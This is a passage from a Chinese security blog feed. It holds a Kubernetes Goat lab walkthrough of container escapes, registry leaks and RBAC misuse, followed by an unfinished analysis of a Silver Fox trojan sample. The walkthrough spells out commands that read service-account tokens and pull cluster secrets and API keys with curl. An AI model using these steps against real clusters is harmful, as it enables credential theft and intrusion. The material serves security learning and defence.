class="" title="2024-04-09_09-08.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><p>近年来Kubernetes敏感信息泄露事件屡见不鲜，通常情况下导致这些原因的一个是配置问题，如果不小心将敏感信息泄露给了错误的配置项，这些信息就可能被未经授权访问，另一个原因是存储问题如果存储的配置不正确，或者使用了不安全的存储后端，攻击者可能通过访问存储后端来获取敏感信息，或者容器共享相同的网络命名空间和文件系统，导致一个容器中的应用程序能够访问其他容器的文件系统或网络通信，那么敏感信息就可能被泄露</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_15-46.png" class="" title="2024-04-08_15-46.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>如上面这个，存在一个git泄漏，这样就可以尝试从网站转储 git存储库</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_15-47.png" class="" title="2024-04-08_15-47.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_15-50.png" class="" title="2024-04-08_15-50.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>使用git log可以查看代码提交的日志记录</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_15-55.png" class="" title="2024-04-08_15-55.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>然后使用checkout检出指定的提交，说不定会有敏感信息泄漏，比如env环境变量等等</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_15-56.png" class="" title="2024-04-08_15-56.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_15-56_1.png" class="" title="2024-04-08_15-56_1.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><h3 id="DIND的利用"><a href="#DIND的利用" class="headerlink" title="DIND的利用"></a>DIND的利用</h3><p>DIND(docker-in-docker)，简单来说就是在Docker容器中调用和执行宿主机的Docker，通常可以挂载 docker.sock 导致容器逃逸</p><p>假设现在存在一个命令注入的场景，如果要利用DIND进行逃逸，前提是在docker容器运行的时候把docker.sock套接字文件一并挂载到了容器中。当我们拿到容器权限又存在挂载的docker.sock套接字文件，我们就可以通过 Docker Socket与宿主机的Docker服务进行通信，我们可以通过它创建新的容器，并把宿主机的目录挂载到新创建的容器中，这样我们就能访问宿主机的资源了</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-02.png" class="" title="2024-04-08_16-02.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>通过信息收集发现了本地挂载docker.sock</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-05.png" class="" title="2024-04-08_16-05.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>然后我们下载一个docker可执行程序</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-09.png" class="" title="2024-04-08_16-09.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-11.png" class="" title="2024-04-08_16-11.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>随后就利用docker.sock来访问宿主机系统并在宿主机上执行docker命令</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-14.png" class="" title="2024-04-08_16-14.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>服务器端请求伪造漏洞是云原生环境的首选攻击方式，通过SSRF可以访问云实例元数据以及内部服务元数据信息</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-17.png" class="" title="2024-04-08_16-17.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>通常情况下，pod部署的时候5000端口常用来做转发，也可以扫描其他端口，寻找敏感信息</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_16-18.png" class="" title="2024-04-08_16-18.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><h3 id="容器逃逸之敏感目录挂载"><a href="#容器逃逸之敏感目录挂载" class="headerlink" title="容器逃逸之敏感目录挂载"></a>容器逃逸之敏感目录挂载</h3><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_19-56.png" class="" title="2024-04-08_19-56.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>通过mount查看挂载信息，可以看到一个host-system的挂载</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-01.png" class="" title="2024-04-08_20-01.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>查看里面的内容，发现像是把宿主机完整的系统都挂载进来了，那么我们可以用chroot切换到宿主机的目录，直接获取对宿主机系统的权限访问</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-05.png" class="" title="2024-04-08_20-05.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>可以使用docker ps查看宿主机运行的容器</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-06.png" class="" title="2024-04-08_20-06.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>目的是控制整个k8s集群，先查看k8s节点级配置文件</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-07.png" class="" title="2024-04-08_20-07.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>随后可以利用配置文件直接获取集群内的所有资源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">kubectl --kubeconfig /etc/kubernetes/kubelet.<span class="hljs-keyword">conf</span>  <span class="hljs-built_in">get</span> <span class="hljs-keyword">all</span> -n kube-<span class="hljs-built_in">system</span><br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-17.png" class="" title="2024-04-08_20-17.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><h3 id="API未授权访问"><a href="#API未授权访问" class="headerlink" title="API未授权访问"></a>API未授权访问</h3><p>容器仓库是存储所有容器镜像的地方，大多数情况下，每个组织都有自己的私有仓库，有时候会因为配置错误，导致仓库处于公共&#x2F;开放状态，此外，如果开发人员因为使用内部私有仓库安全配置不当，可能会在在容器镜像中存储一些敏感信息</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-53.png" class="" title="2024-04-08_20-53.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>我们可以利用API文档来测试访问仓库的信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">API文档参考：https:<span class="hljs-regexp">//</span>docs.docker.com<span class="hljs-regexp">/registry/</span>spec<span class="hljs-regexp">/api/</span><br></code></pre></td></tr></table></figure><p>列出存储库</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-54.png" class="" title="2024-04-08_20-54.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>查看仓库的具体信息，并且可以直接未授权下载下来</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-55.png" class="" title="2024-04-08_20-55.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>通过审计，可以发现镜像信息中有API密钥信息和ENV变量等敏感信息泄露</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-58.png" class="" title="2024-04-08_20-58.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><h3 id="挖矿分析"><a href="#挖矿分析" class="headerlink" title="挖矿分析"></a>挖矿分析</h3><p>因为鉴于k8s环境的复杂性和神秘性，我们很难知道其中的容器镜像是基于什么构建的，并且部署了哪些主动监控也都是未知数，所以k8s很容易成为挖矿攻击的目标，遇到此类攻击，我们该如何识别和分析？首先，我们需要确定k8s集群中的所有资源&#x2F;镜像以及作业，一旦我们确定了在k8s集群中运行的作业，就可以通过以下命令，来获取pod信息</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl describe job batch-check-job<br>kubectl <span class="hljs-keyword">get</span> pods --<span class="hljs-keyword">namespace</span> <span class="hljs-keyword">default</span> -l <span class="hljs-string">&quot;job-name=batch-check-job&quot;</span><br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_21-16.png" class="" title="2024-04-08_21-16.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>然后进行manifest分析，manifest是一个json或yaml格式的Kubernetes API对象描述</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">kubectl <span class="hljs-built_in">get</span> pod <span class="hljs-built_in">batch</span>-check-job-xxxx -o yaml<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_21-18.png" class="" title="2024-04-08_21-18.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_21-18_1.png" class="" title="2024-04-08_21-18_1.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>可以看到Docker镜像名称，然后通过docker history查看镜像的构建历史记录，检查每一层的构建中是否植入了恶意挖矿脚本</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker <span class="hljs-keyword">history</span> --<span class="hljs-keyword">no</span>-<span class="hljs-built_in">trunc</span> madhuakula/k8s-goat-batch-check<br></code></pre></td></tr></table></figure><h3 id="敏感信息提取与恢复"><a href="#敏感信息提取与恢复" class="headerlink" title="敏感信息提取与恢复"></a>敏感信息提取与恢复</h3><p>在容器化世界中，密码、私钥、令牌等很容易被错误处理或者增加了一些看不到的敏感信息文件，我们该如何恢复提取？<br>首先，尽可能多的尝试浏览运行容器中的所有文件、环境变量等</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_14-31.png" class="" title="2024-04-09_14-31.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>通过分析镜像信息，找到敏感信息，我们可以通过镜像反向生成dockerfile</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">alias <span class="hljs-attribute">dfimage</span>=<span class="hljs-string">&quot;docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage&quot;</span><br>dfimage <span class="hljs-attribute">-sV</span>=1.36 madhuakula/k8s-goat-hidden-in-layers<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_14-43.png" class="" title="2024-04-09_14-43.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>或者使用Dive工具，可以辅助分析镜像的每一层，下载地址：<a href="https://github.com/wagoodman/dive">https://github.com/wagoodman/dive</a></p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_14-42.png" class="" title="2024-04-09_14-42.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><p>通过分析，可以看到&#x2F;root&#x2F;contributions.txt, &#x2F;root&#x2F;secret.txt这两个比较重要和可疑的文件，并且secret.txt在构建的时候被删除了，我们现在来恢复它</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_14-51.png" class="" title="2024-04-09_14-51.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>使用docker save把镜像导出文件并解压，这里因为只有3层，所以很容易提取所有的层并检查内容，找到相对应的id进行二次解压即可得到敏感信息文件</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_14-52.png" class="" title="2024-04-09_14-52.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><h3 id="RBAC最低权限配置错误"><a href="#RBAC最低权限配置错误" class="headerlink" title="RBAC最低权限配置错误"></a>RBAC最低权限配置错误</h3><p>RBAC是对K8S集群中的一些Pod采取限制，以防止它们访问 API server，从而帮助保护 Kubernetes 集群，但一些错误配置可能导致访问控制薄弱，无法实现最小特权原则，攻击者往往利用绑定到 pod的serviceaccount提供的webhookapikey访问权限来控制和获取敏感资源，默认情况下将所有secrets、tokens和service accounts信息都存储在一个固定的目录，通常是在&#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;目录下面</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_14-56.png" class="" title="2024-04-09_14-56.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>可以使用这些信息与 Kubernetes API服务进行交互访问，从而达到获取敏感资源信息的目的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">指向内部 API 服务器主机名：<span class="hljs-built_in">export</span> <span class="hljs-attribute">APISERVER</span>=https://$&#123;KUBERNETES_SERVICE_HOST&#125;<br>设置 ServiceAccount令牌的路径：<span class="hljs-built_in">export</span> <span class="hljs-attribute">SERVICEACCOUNT</span>=/var/run/secrets/kubernetes.io/serviceaccount<br>读取 pods namespace并将其设置为变量：<span class="hljs-built_in">export</span> <span class="hljs-attribute">NAMESPACE</span>=$(cat <span class="hljs-variable">$&#123;SERVICEACCOUNT&#125;</span>/namespace)<br>指定读取ServiceAccount持有者令牌：<span class="hljs-built_in">export</span> <span class="hljs-attribute">TOKEN</span>=$(cat <span class="hljs-variable">$&#123;SERVICEACCOUNT&#125;</span>/token)<br>指定在curl请求查询时要使用的证书路径:<span class="hljs-built_in">export</span> <span class="hljs-attribute">CACERT</span>=<span class="hljs-variable">$&#123;SERVICEACCOUNT&#125;</span>/ca.crt<br></code></pre></td></tr></table></figure><p>然后就可以使用令牌和构造的查询来访问 Kubernetes API了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">curl --cacert <span class="hljs-variable">$&#123;CACERT&#125;</span> --header <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$&#123;TOKEN&#125;</span>&quot;</span> -X <span class="hljs-built_in">GET</span> <span class="hljs-variable">$&#123;APISERVER&#125;</span>/api<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_15-00.png" class="" title="2024-04-09_15-00.png"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>因为 Kubernetes本身是利用API服务来创建、删除 pod等操作的，所以接下来的操作就很多了，比如查询default命名空间中的secrets</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --cacert <span class="hljs-variable">$&#123;CACERT&#125;</span> --header <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="hljs-variable">$&#123;APISERVER&#125;</span>/api/v1/secrets<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_15-01.png" class="" title="2024-04-09_15-01.png"><h6 id="-36"><a href="#-36" class="headerlink" title=""></a></h6><p>查询特定命名空间的secrets</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --cacert <span class="hljs-variable">$&#123;CACERT&#125;</span> --header <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="hljs-variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="hljs-variable">$&#123;NAMESPACE&#125;</span>/secrets<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_15-03.png" class="" title="2024-04-09_15-03.png"><h6 id="-37"><a href="#-37" class="headerlink" title=""></a></h6><p>获取 k8svaultapikey</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --cacert <span class="hljs-variable">$&#123;CACERT&#125;</span> --header <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="hljs-variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="hljs-variable">$&#123;NAMESPACE&#125;</span>/secrets | grep k8svaultapikey<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_15-04.png" class="" title="2024-04-09_15-04.png"><h6 id="-38"><a href="#-38" class="headerlink" title=""></a></h6><h2 id="自动化基线检查与安全评估"><a href="#自动化基线检查与安全评估" class="headerlink" title="自动化基线检查与安全评估"></a>自动化基线检查与安全评估</h2><h3 id="Docker-CIS-安全基线分析"><a href="#Docker-CIS-安全基线分析" class="headerlink" title="Docker CIS 安全基线分析"></a>Docker CIS 安全基线分析</h3><p>场景主要用于在Kubernetes节点之上进行Docker CIS基准分析，以识别可能存在的安全漏洞，首先需要部署docker bench security将它启动为DaemonSet</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kubectl apply -f scenarios<span class="hljs-regexp">/docker-bench-security/</span>deployment.yaml<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-40.png" class="" title="2024-04-08_20-40.png"><h6 id="-39"><a href="#-39" class="headerlink" title=""></a></h6><p>访问docker-bench-security-xxxxx pod 并执行Docker CIS基线测试脚本（如果有多个节点，就依次进入并执行）最后，可以根据 Docker CIS安全基线测试的结果进行进一步的利用或修复</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-45.png" class="" title="2024-04-08_20-45.png"><h6 id="-40"><a href="#-40" class="headerlink" title=""></a></h6><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-45_1.png" class="" title="2024-04-08_20-45_1.png"><h6 id="-41"><a href="#-41" class="headerlink" title=""></a></h6><h3 id="Kubernetes-CIS-安全基线分析"><a href="#Kubernetes-CIS-安全基线分析" class="headerlink" title="Kubernetes CIS 安全基线分析"></a>Kubernetes CIS 安全基线分析</h3><p>场景主要用在Kubernetes节点之上进行Kubernetes CIS基线分析，识别可能存在的安全漏洞，首先，我们在节点上部署kube-bench security为Kubernetes job</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">kubectl apply -f scenarios/kube-bench-security/<span class="hljs-keyword">node</span><span class="hljs-title">-job</span>.yaml<br>kubectl apply -f scenarios/kube-bench-security/<span class="hljs-literal">master</span>-job.yaml<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-48.png" class="" title="2024-04-08_20-48.png"><h6 id="-42"><a href="#-42" class="headerlink" title=""></a></h6><p>然后获取pod信息和查看jobs列表</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-49.png" class="" title="2024-04-08_20-49.png"><h6 id="-43"><a href="#-43" class="headerlink" title=""></a></h6><p>最后通过查看pod日志进行漏洞分析和修补</p><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-08_20-51.png" class="" title="2024-04-08_20-51.png"><h6 id="-44"><a href="#-44" class="headerlink" title=""></a></h6><h3 id="KubeAudit审计k8s集群"><a href="#KubeAudit审计k8s集群" class="headerlink" title="KubeAudit审计k8s集群"></a>KubeAudit审计k8s集群</h3><p>kubeaudit是一个命令行工具和一个 Go包，用于审计 Kubernetes集群各种不同的安全问题，下载链接：<a href="https://github.com/Shopify/kubeaudit">https://github.com/Shopify/kubeaudit</a><br>Kubeaudit会检测在集群中的容器是否运行，并且会审计该集群中的所有Kubernetes资源</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">kubeaudit <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_18-29.png" class="" title="2024-04-09_18-29.png"><h6 id="-45"><a href="#-45" class="headerlink" title=""></a></h6><h3 id="Sysdig-Falco安全监控与检测"><a href="#Sysdig-Falco安全监控与检测" class="headerlink" title="Sysdig Falco安全监控与检测"></a>Sysdig Falco安全监控与检测</h3><p>Falco是一个云原生运行时安全工具，旨在检测应用程序中的异常活动，可用于监控Kubernetes应用程序和内部组件的运行时安全性。 仅需为Falco撰写一套规则，即可持续监测并监控容器、应用、主机及网络的异常活动，Falco可在运行时检测意外的应用程序行为并发出威胁警报；使用前需要用helm v3进行部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">helm repo add falcosecurity https://falcosecurity.github.io/charts<br>helm repo update<br>helm install falco --<span class="hljs-built_in">set</span> falco.jsonOutput=<span class="hljs-literal">true</span>  falcosecurity/falco<br></code></pre></td></tr></table></figure><img src="/2024/04/10/k8s%E5%AE%89%E5%85%A8/2024-04-09_15-34.png" class="" title="2024-04-09_15-34.png"><h6 id="-46"><a href="#-46" class="headerlink" title=""></a></h6><p>Z29vZGJ5ZQo&#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次失败的银狐病毒样本分析</title>
    <link href="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>样本基本信息：<br>银狐组织的木马病毒（银狐病毒）</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-47.png" class="" title="2024-04-03_16-47.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>样本的主要行为是从一个可疑的地址下载文件并执行</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-49.png" class="" title="2024-04-03_16-49.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>通过对其网络连接以及流量抓包可知，该程序下载了5个文件</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_16-49.png" class="" title="2024-04-01_16-49.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_16-48.png" class="" title="2024-04-01_16-48.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>其实，直接通过分析病毒样本，也可以发现该下载行为，从指定的url处分别下载一个exe,一个dat,一个jpg，一个xml，所以这个所谓的“财会人员薪资补贴调整新政策所需材料.exe”文件其实为为木马释放器，并非为直接木马</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_17-27.png" class="" title="2024-04-01_17-27.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_17-05.png" class="" title="2024-04-01_17-05.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>下载下来以便进行进一步的分析，其中文件2是一个压缩包，尝试解压发现需要密码</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_16-50.png" class="" title="2024-04-01_16-50.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>继续分析其他下载下来的文件，尝试寻找压缩包密码，在文件1中发现了upx加壳</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-48.png" class="" title="2024-04-01_19-48.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>解壳之后继续进行分析，原来这个文件1叫tu_rt.exe; 此程序为白文件实际是NetSarang系列工具更新程序</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_13-26.png" class="" title="2024-04-03_13-26.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>并且在分析的时，通过使用字符串搜索，搜到一个类似于密钥的数字字母字符串</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-48_1.png" class="" title="2024-04-01_19-48_1.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>尝试拿去进行解压压缩包，成功解压</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-49.png" class="" title="2024-04-01_19-49.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>通过strings读取_TUProj.dat，发现开头插入了病毒脚本，不过dat里面的shellcode看不懂是干啥的 就没再往下分析</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-53.png" class="" title="2024-04-01_19-53.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_19-56.png" class="" title="2024-04-01_19-56.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>回归到病毒本身，程序运行后会检测360程序，有360程序则会弹框，并退出程序执行</p><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-01_15-50.png" class="" title="2024-04-01_15-50.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_17-44.png" class="" title="2024-04-03_17-44.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>因为技术太菜，exe静态分析分析不动了，希望有大佬可以指点一下小弟，毕竟小弟只是练习两年半的实习生😫</p><p>下面就水一下凑凑数吧，病毒带的一些ico和行为交互</p><img 